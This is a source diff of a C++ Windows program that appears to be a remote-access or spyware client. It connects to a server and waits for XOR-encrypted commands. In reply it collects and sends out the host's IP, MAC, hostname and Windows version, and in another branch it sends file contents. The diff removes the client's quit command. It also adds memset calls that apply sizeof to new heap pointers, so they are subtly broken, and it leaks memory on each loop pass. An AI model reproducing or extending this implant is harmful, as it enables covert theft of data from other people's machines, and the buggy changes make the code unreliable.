@@ -47,7 +47,7 @@ static inline bool is_base64(unsigned char c) {
 }
 
 std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
-    std::string ret;
+    std::string ret = "";
     int i = 0;
     int j = 0;
     unsigned char char_array_3[3];
@@ -256,9 +256,9 @@ string convertToString(char* a)
 
 std::string decryption(char* cipher, int size)
 {
-    string decrypted;
+    string decrypted = "";
     string q = ":&";
-    string decryptedString;
+    string decryptedString = "";
     decrypted = XOR(cipher, q);
     char* decrypt = new char[strlen(decrypted.c_str())];
     //decryptedString = decrypted; //.substr(0, decrypted.find("=")) + "=";
@@ -294,10 +294,10 @@ int __cdecl main(int argc, char **argv)
 
     tuple1 information = getMAC();
 
-    char recvbuf[DEFAULT_BUFLEN];
-    int iResult;
+    char* recvbuf = new char[DEFAULT_BUFLEN];
+    int iResult = 0;
     int recvbuflen = DEFAULT_BUFLEN;
-    string decryptedString2;
+    string decryptedString2 = "";
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -362,15 +362,15 @@ int __cdecl main(int argc, char **argv)
     while (true)
     {
         cout << "\t----------Waiting for instructions---------------" << endl;
-        char username[UNLEN + 1];
+        char* username = new char[UNLEN + 1];
         int username_len = UNLEN + 1;
         gethostname(username, username_len);
         iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
         decryptedString2 = convertToString(recvbuf);
         decryptedString2 = decryption(recvbuf, strlen(recvbuf));
         string rc = string(decryptedString2);
-        string encryptedString;
-        char encrypted_star[512];
+        string encryptedString = "0";
+        char* encrypted_star = new char[512];
         if (rc.find("1") != std::string::npos)
         {
             
@@ -382,7 +382,6 @@ int __cdecl main(int argc, char **argv)
             printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
             information.ipAddress += '\000';
             information.macAddress += '\000';
-            cout << "Sending the information" << endl;
             cout << information.ipAddress << "..." << endl;
             encryptedString = encryption(information.ipAddress, strlen(information.ipAddress));
             strcpy(encrypted_star, encryptedString.c_str());
@@ -410,6 +409,10 @@ int __cdecl main(int argc, char **argv)
             strcpy(encrypted_star, encryptedString.c_str());
             iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
             memset(recvbuf, 0, sizeof recvbuf);
+            memset(username, 0, sizeof username);
+            memset(encrypted_star, 0, sizeof encrypted_star);
+
+            cout << "Sending the information" << endl;
         }
         else if (rc.find("2") != std::string::npos)
         {
@@ -449,6 +452,7 @@ int __cdecl main(int argc, char **argv)
                 iResult = send(ConnectSocket, content, strlen(content), 0);
                 cout << "File sent" << endl;
                 memset(recvbuf, 0, sizeof recvbuf);
+                memset(encrypted_star, 0, sizeof encrypted_star);
             }
             else
             {
@@ -517,13 +521,9 @@ int __cdecl main(int argc, char **argv)
                 //iResult = send(ConnectSocket, temp.c_str(), temp.length(), 0);
                 //iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                 memset(recvbuf, 0, sizeof recvbuf);
+                memset(encrypted_star, 0, sizeof encrypted_star);
 
             }
-        }
-        else if (rc.find("4") != std::string::npos)
-        {
-            cout << "Quiting" << endl;
-            break;
         }
         else
         {
